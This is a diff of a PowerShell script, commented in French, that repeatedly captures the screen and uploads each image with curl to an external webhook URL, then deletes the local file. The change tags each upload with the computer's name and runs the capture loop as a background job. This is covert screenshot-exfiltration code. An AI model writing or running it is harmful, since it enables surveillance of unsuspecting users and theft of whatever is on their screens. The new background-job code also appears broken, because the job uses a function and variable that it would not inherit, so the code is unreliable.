@@ -22,12 +22,22 @@ Function TakeAndSendScreenshot {
     $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
     $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
     Start-Sleep 1
-    curl.exe -F "file1=@$filett" $hookurl
+    $computerName = $env:COMPUTERNAME
+    $text = "Capture d'écran de $computerName"
+    curl.exe -F "file1=@$filett" -F "text=$text" $hookurl
     Start-Sleep 1
     Remove-Item -Path $filett
 }
 
-# Prendre et envoyer 2 captures d'écran
-for ($i = 0; $i -lt $a; $i++) {
-    TakeAndSendScreenshot
+# Démarrer une tâche en arrière-plan pour prendre et envoyer les captures d'écran
+$job = Start-Job -ScriptBlock {
+    for ($i = 0; $i -lt $a; $i++) {
+        TakeAndSendScreenshot
+    }
 }
+
+# Attendre que la tâche en arrière-plan se termine
+Wait-Job $job | Out-Null
+
+# Supprimer la tâche en arrière-plan
+Remove-Job $job
